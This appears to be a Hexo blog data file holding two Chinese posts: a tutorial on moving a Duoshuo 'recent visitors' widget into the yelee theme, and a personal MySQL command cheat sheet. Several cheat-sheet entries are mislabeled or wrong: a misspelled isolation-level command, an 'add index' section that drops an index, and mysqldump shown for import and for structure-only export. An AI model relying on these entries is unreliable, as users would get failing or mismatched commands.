class=\"headerlink\" title=\"1. 准备挂件\"></a>1. 准备挂件</h3><p>如果主题开启并使用了多说评论的话，只需要添加如下内容即可:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ds-recent-visitors\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>如果并未开启多说评论的话，需要注册多说并额外添加多说js内容如下:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!--多说js加载开始，一个页面只需要加载一次 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\"><span class=\"keyword\">var</span> duoshuoQuery = &#123;short_name:<span class=\"string\">\"您的多说二级域名\"</span>&#125;;</div><div class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">var</span> ds = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</div><div class=\"line\">    ds.type = <span class=\"string\">'text/javascript'</span>;ds.async = <span class=\"literal\">true</span>;</div><div class=\"line\">    ds.src = <span class=\"string\">'http://static.duoshuo.com/embed.js'</span>;</div><div class=\"line\">    ds.charset = <span class=\"string\">'UTF-8'</span>;</div><div class=\"line\">    (<span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">'head'</span>)[<span class=\"number\">0</span>] || <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">'body'</span>)[<span class=\"number\">0</span>]).appendChild(ds);</div><div class=\"line\">&#125;)();</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--多说js加载结束，一个页面只需要加载一次 --&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这部分内容为了更加通用，可以将内容写入到ejs模板文件中，然后通过加载外部模板方式引入到主题中。<br>我就是将上述内容放在自定义模板文件: <code>layout/_plugin/duoshuo_visitor.ejs</code> 。</p>\n<p>参见:<a href=\"http://dev.duoshuo.com/docs/4ff28d6f552860f21f00000c\" target=\"_blank\" rel=\"external\">通用代码【最近访客】使用方法</a></p>\n<h3 id=\"2-添加多说最近访客\"><a href=\"#2-添加多说最近访客\" class=\"headerlink\" title=\"2. 添加多说最近访客\"></a>2. 添加多说最近访客</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%if(theme.visitor)&#123;%</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span> <span class=\"attr\">class</span>=<span class=\"string\">\"switch-part switch-part5\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"widget visitor\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"js-visitor\"</span>&gt;</span></div><div class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">_plugin</span>/<span class=\"attr\">duoshuo_visitor</span>') %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"3-最近访客样式\"><a href=\"#3-最近访客样式\" class=\"headerlink\" title=\"3. 最近访客样式\"></a>3. 最近访客样式</h3><p>打开主题下 source/css/_partial/main.styl 文件。<br>找到switch-part4节点，然后类似的添加 switch-part5 内容，如下:<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-class\">.switch-part4</span>&#123;</div><div class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">300%</span>;</div><div class=\"line\">    <span class=\"attribute\">text-align</span>: left;</div><div class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">30px</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"selector-class\">.switch-part5</span>&#123;</div><div class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">400%</span>;</div><div class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">30px</span>;</div><div class=\"line\">    <span class=\"attribute\">max-height</span>: <span class=\"number\">260px</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-添加详情页菜单项图标\"><a href=\"#4-添加详情页菜单项图标\" class=\"headerlink\" title=\"4. 添加详情页菜单项图标\"></a>4. 添加详情页菜单项图标</h3><p>直接copy aboutme的图标内容。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%if(theme.visitor)&#123;%</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icon-wrap icon-me hide\"</span> <span class=\"attr\">data-idx</span>=<span class=\"string\">\"4\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"user\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"shoulder\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-效果图-1\"><a href=\"#5-效果图-1\" class=\"headerlink\" title=\"5. 效果图\"></a>5. 效果图</h3><p><img src=\"/asserts/images/article/yelee主题最近访客/2016-08-20 14-27-49.jpg\" alt=\"最近访客详情页\"></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/blog9.png\" title=\"blog\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近将博客hexo主题由原来的jacman换成高大上的yelee。<br>原来在jacman主题自定义了一些挂件，例如:多说的最近访客。<br>希望将原来的 <strong>最近访客</strong> 挂件迁移到yelee主题。</p>\n<h2 id=\"二、菜单项\"><a href=\"#二、菜单项\" class=\"headerlink\" title=\"二、菜单项\"></a>二、菜单项</h2><h3 id=\"1-查找菜单项文件\"><a href=\"#1-查找菜单项文件\" class=\"headerlink\" title=\"1. 查找菜单项文件\"></a>1. 查找菜单项文件</h3><p>通过chrome开发者工具，查看菜单 <strong>关于我</strong> 菜单项内容元素。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span> <span class=\"attr\">class</span>=<span class=\"string\">\"switch-part switch-part4\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"js-aboutme\"</span>&gt;</span>只求成为一名靠谱的码农<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>然后，根据元素标签特征(这里选 <strong>switch-part4</strong> )，在yelee主题目录搜索layout目录下包含 <strong>switch-part4</strong> 的文件内容。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:yelee yeshaoting$ grep -ir <span class=\"string\">\"switch-part4\"</span> layout/</div><div class=\"line\">layout//_partial/left-col.ejs:                &lt;section class=<span class=\"string\">\"switch-part switch-part4\"</span>&gt;</div></pre></td></tr></table></figure></p>\n<p>可以看到，该文件内容存在于 layout//_partial/left-col.ejs 目录。</p>\n<h3 id=\"2-添加菜单项\"><a href=\"#2-添加菜单项\" class=\"headerlink\" title=\"2. 添加菜单项\"></a>2. 添加菜单项</h3><p>在left-col.ejs文件里，找到tips-box元素块，并类似aboutme添加visitor，如下:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tips-box hide\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tips-arrow\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"tips-inner\"</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.menu</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.tags</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%if(theme.friends</span> &amp;&amp; <span class=\"attr\">theme.friends.length</span> != <span class=\"string\">0)&#123;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.friends</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%if(theme.aboutme)&#123;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.about</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%if(theme.visitor)&#123;%</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">__</span>('<span class=\"attr\">index.visitor</span>') %&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"3-菜单项名称\"><a href=\"#3-菜单项名称\" class=\"headerlink\" title=\"3. 菜单项名称\"></a>3. 菜单项名称</h3><p>由于主题支持多语言，因此通过 <code>__(&#39;index.visitor&#39;)</code> 这些的方法从语言包里获取对应的内容。<br>该语言文件在主题的languages目录。我的设置为:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"># zh-Hans: Chinese (Simplified) 大陆简体</div><div class=\"line\">index:</div><div class=\"line\">  menu: 菜单</div><div class=\"line\">  tags: 标签</div><div class=\"line\">  friends: 友情链接</div><div class=\"line\">  about: 个人签名</div><div class=\"line\">  visitor: 最近访客</div><div class=\"line\">  more: 阅读全文</div><div class=\"line\">  copy: 复制</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-开启菜单项\"><a href=\"#4-开启菜单项\" class=\"headerlink\" title=\"4. 开启菜单项\"></a>4. 开启菜单项</h3><p>注意到主题配置文件里，通过aboutme来开关“关于我”菜单项。<br>同样，我们也在配置文件里添加一项来控制“最近访客”菜单项是否展示。如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#是否开启“最近访客”功能。</span></div><div class=\"line\">visitor: <span class=\"literal\">true</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-效果图\"><a href=\"#5-效果图\" class=\"headerlink\" title=\"5. 效果图\"></a>5. 效果图</h3><p><img src=\"/asserts/images/article/yelee主题最近访客/2016-08-20 13-41-17.jpg\" alt=\"最近访客菜单项\"></p>","more":"<h2 id=\"三、最近访客详情\"><a href=\"#三、最近访客详情\" class=\"headerlink\" title=\"三、最近访客详情\"></a>三、最近访客详情</h2><h3 id=\"1-准备挂件\"><a href=\"#1-准备挂件\" class=\"headerlink\" title=\"1. 准备挂件\"></a>1. 准备挂件</h3><p>如果主题开启并使用了多说评论的话，只需要添加如下内容即可:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ds-recent-visitors\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>如果并未开启多说评论的话，需要注册多说并额外添加多说js内容如下:<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!--多说js加载开始，一个页面只需要加载一次 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"javascript\"></div><div class=\"line\"><span class=\"keyword\">var</span> duoshuoQuery = &#123;short_name:<span class=\"string\">\"您的多说二级域名\"</span>&#125;;</div><div class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">var</span> ds = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</div><div class=\"line\">    ds.type = <span class=\"string\">'text/javascript'</span>;ds.async = <span class=\"literal\">true</span>;</div><div class=\"line\">    ds.src = <span class=\"string\">'http://static.duoshuo.com/embed.js'</span>;</div><div class=\"line\">    ds.charset = <span class=\"string\">'UTF-8'</span>;</div><div class=\"line\">    (<span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">'head'</span>)[<span class=\"number\">0</span>] || <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">'body'</span>)[<span class=\"number\">0</span>]).appendChild(ds);</div><div class=\"line\">&#125;)();</div><div class=\"line\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--多说js加载结束，一个页面只需要加载一次 --&gt;</span></div></pre></td></tr></table></figure></p>\n<p>这部分内容为了更加通用，可以将内容写入到ejs模板文件中，然后通过加载外部模板方式引入到主题中。<br>我就是将上述内容放在自定义模板文件: <code>layout/_plugin/duoshuo_visitor.ejs</code> 。</p>\n<p>参见:<a href=\"http://dev.duoshuo.com/docs/4ff28d6f552860f21f00000c\">通用代码【最近访客】使用方法</a></p>\n<h3 id=\"2-添加多说最近访客\"><a href=\"#2-添加多说最近访客\" class=\"headerlink\" title=\"2. 添加多说最近访客\"></a>2. 添加多说最近访客</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%if(theme.visitor)&#123;%</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span> <span class=\"attr\">class</span>=<span class=\"string\">\"switch-part switch-part5\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"widget visitor\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"js-visitor\"</span>&gt;</span></div><div class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">_plugin</span>/<span class=\"attr\">duoshuo_visitor</span>') %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"3-最近访客样式\"><a href=\"#3-最近访客样式\" class=\"headerlink\" title=\"3. 最近访客样式\"></a>3. 最近访客样式</h3><p>打开主题下 source/css/_partial/main.styl 文件。<br>找到switch-part4节点，然后类似的添加 switch-part5 内容，如下:<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-class\">.switch-part4</span>&#123;</div><div class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">300%</span>;</div><div class=\"line\">    <span class=\"attribute\">text-align</span>: left;</div><div class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">30px</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"selector-class\">.switch-part5</span>&#123;</div><div class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">400%</span>;</div><div class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">30px</span>;</div><div class=\"line\">    <span class=\"attribute\">max-height</span>: <span class=\"number\">260px</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h3 id=\"4-添加详情页菜单项图标\"><a href=\"#4-添加详情页菜单项图标\" class=\"headerlink\" title=\"4. 添加详情页菜单项图标\"></a>4. 添加详情页菜单项图标</h3><p>直接copy aboutme的图标内容。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%if(theme.visitor)&#123;%</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icon-wrap icon-me hide\"</span> <span class=\"attr\">data-idx</span>=<span class=\"string\">\"4\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"user\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"shoulder\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%&#125;%</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-效果图-1\"><a href=\"#5-效果图-1\" class=\"headerlink\" title=\"5. 效果图\"></a>5. 效果图</h3><p><img src=\"/asserts/images/article/yelee主题最近访客/2016-08-20 14-27-49.jpg\" alt=\"最近访客详情页\"></p>"},{"title":"mysql数据库命令小记","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 查看innodb引擎状态\n可用于查看死锁情况：\nshow engine innodb status;\n\n## 查看锁情况\n表锁：show global status like 'table_locks%';\n行锁：show global status like 'innodb_row_lock%';\n\n\n## 文件打开数\nshow global status like 'open_files';\n\n\n## 查看慢查询\nshow full processlist;\nSELECT * FROM information_schema.INNODB_TRX;\nselect @@autocommit;\n\n\n## 设置对应的编码\nset character_set_server=utf8;\n\n\n## 查看数据库编码\nSHOW VARIABLES LIKE 'character%';\n\n<!-- more -->\n\n## 查看日期毫秒数\nselect unix_timestamp('2009-10-26 10:06:07');\n\n\n## 查看日期\nselect from_unixtime(1430211829676/1000);\n\n\n## 查看表索引\nshow index from table;\n\n\n## 查看数据库表字段\nselect COLUMN_NAME from information_schema.COLUMNS\nwhere table_name = 'channel_movie' \nand table_schema = 'movie_ticket';\n\n\n## 数据库事务隔离级别\n\n### 查看当前会话隔离级别\nselect @@tx_isolation;\n\n### 查看系统当前隔离级别\nselect @@global.tx_isolation;\n\n### 设置当前会话隔离级别\nset session transaction isolatin level repeatable read;\n\n### 设置系统当前隔离级别\nset global transaction isolation level repeatable read;\n\n\n## 显示数据表索引\nshow index from user_login_status;\n\n\n## 删除重复数据（性能不佳）\n``` sql\nset sql_safe_updates=0;\ndelete from netnews.item\nwhere id not in (\n     select id from (\n          select  min(id) as id from netnews.item group by channel_id, link\n     ) as tab\n);\nset sql_safe_updates=1;\n```\n\n\n## 安全更新状态修改\n关闭：set sql_safe_updates=0;\n打开：set sql_safe_updates=1;\n\n\n## 查看mysql系统状态\nshow status\nshow processlist\n\n\n## 临时修改内容显示字符集\ncharset utf8\n\n\n## 修改索引\nALTER TABLE `babel_idea`.`i_product_owner`\nDROP INDEX `name_UNIQUE` ,\nADD UNIQUE INDEX `unique_product_owner_name` (`name` ASC);\n\n\n## 显示索引\nshow index from i_product;\n\n\n## 删除索引\nalter table i_product drop index fk_product_deleted_idx;\n\n\n## 按条件导出mysql表数据\n`mysqldump -u root -p 数据库名 --no-create-db=TRUE --no-create-info=TRUE --add-drop-table=FALSE --where=\"id >1000\" 表明>导出文件名.sql`\n\n\n## mysqldump数据导入\nmysqldump babel_idea < babel_idea.sql\n\n\n## 启用safe mode(update, delete, select操作需要包含主键的where条件)\nset sql_safe_updates=1;\n\n\n## 关闭safe mode\nset sql_safe_updates=0;\n\n\n## 修改表字段\nalter table i_product\nadd column `deleted` tinyint not null\ndefault 0\ncomment '逻辑删除，是否已删除(0: 未删除，1: 删除)';\n\n\n\n## 添加索引\n\n### 添加单一索引\nalter table i_product\ndrop index `fk_product_product_idx`;\n\n### 添加联合索引\nalter table i_product\nadd index `fk_product_id_parent_idx`\n(id, parent);\n\n\n## 创建数据库(设置默认字符集)\ncreate database `babel_idea` DEFAULT CHARACTER SET utf8;\n\n\n## 只导出数据库数据表结构\n~/local/mysql/bin/mysqldump -ubkmadmin -pbkmadmin -t babel_idea > ~/babel_idea.schema.sql\n\n","source":"_posts/article/database/mysql数据库命令小记.md","raw":"categories:\n  - 数据存储\ntags:\n  - mysql\n  - 小记\n  - 命令\ntitle: mysql数据库命令小记\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 查看innodb引擎状态\n可用于查看死锁情况：\nshow engine innodb status;\n\n## 查看锁情况\n表锁：show global status like 'table_locks%';\n行锁：show global status like 'innodb_row_lock%';\n\n\n## 文件打开数\nshow global status like 'open_files';\n\n\n## 查看慢查询\nshow full processlist;\nSELECT * FROM information_schema.INNODB_TRX;\nselect @@autocommit;\n\n\n## 设置对应的编码\nset character_set_server=utf8;\n\n\n## 查看数据库编码\nSHOW VARIABLES LIKE 'character%';\n\n<!-- more -->\n\n## 查看日期毫秒数\nselect unix_timestamp('2009-10-26 10:06:07');\n\n\n## 查看日期\nselect from_unixtime(1430211829676/1000);\n\n\n## 查看表索引\nshow index from table;\n\n\n## 查看数据库表字段\nselect COLUMN_NAME from information_schema.COLUMNS\nwhere table_name = 'channel_movie' \nand table_schema = 'movie_ticket';\n\n\n## 数据库事务隔离级别\n\n### 查看当前会话隔离级别\nselect @@tx_isolation;\n\n### 查看系统当前隔离级别\nselect @@global.tx_isolation;\n\n### 设置当前会话隔离级别\nset session transaction isolatin level repeatable read;\n\n### 设置系统当前隔离级别\nset global transaction isolation level repeatable read;\n\n\n## 显示数据表索引\nshow index from user_login_status;\n\n\n## 删除重复数据（性能不佳）\n``` sql\nset sql_safe_updates=0;\ndelete from netnews.item\nwhere id not in (\n     select id from (\n          select  min(id) as id from netnews.item group by channel_id, link\n     ) as tab\n);\nset sql_safe_updates=1;\n```\n\n\n## 安全更新状态修改\n关闭：set sql_safe_updates=0;\n打开：set sql_safe_updates=1;\n\n\n## 查看mysql系统状态\nshow status\nshow processlist\n\n\n## 临时修改内容显示字符集\ncharset utf8\n\n\n## 修改索引\nALTER TABLE `babel_idea`.`i_product_owner`\nDROP INDEX `name_UNIQUE` ,\nADD UNIQUE INDEX `unique_product_owner_name` (`name` ASC);\n\n\n## 显示索引\nshow index from i_product;\n\n\n## 删除索引\nalter table i_product drop index fk_product_deleted_idx;\n\n\n## 按条件导出mysql表数据\n`mysqldump -u root -p 数据库名 --no-create-db=TRUE --no-create-info=TRUE --add-drop-table=FALSE --where=\"id >1000\" 表明>导出文件名.sql`\n\n\n## mysqldump数据导入\nmysqldump babel_idea < babel_idea.sql\n\n\n## 启用safe mode(update, delete, select操作需要包含主键的where条件)\nset sql_safe_updates=1;\n\n\n## 关闭safe mode\nset sql_safe_updates=0;\n\n\n## 修改表字段\nalter table i_product\nadd column `deleted` tinyint not null\ndefault 0\ncomment '逻辑删除，是否已删除(0: 未删除，1: 删除)';\n\n\n\n## 添加索引\n\n### 添加单一索引\nalter table i_product\ndrop index `fk_product_product_idx`;\n\n### 添加联合索引\nalter table i_product\nadd index `fk_product_id_parent_idx`\n(id, parent);\n\n\n## 创建数据库(设置默认字符集)\ncreate database `babel_idea` DEFAULT CHARACTER SET utf8;\n\n\n## 只导出数据库数据表结构\n~/local/mysql/bin/mysqldump -ubkmadmin -pbkmadmin -t babel_idea > ~/babel_idea.schema.sql\n\n","slug":"article/database/mysql数据库命令小记","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxr3001y5nbtgibvi1ne","content":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"查看innodb引擎状态\"><a href=\"#查看innodb引擎状态\" class=\"headerlink\" title=\"查看innodb引擎状态\"></a>查看innodb引擎状态</h2><p>可用于查看死锁情况：<br>show engine innodb status;</p>\n<h2 id=\"查看锁情况\"><a href=\"#查看锁情况\" class=\"headerlink\" 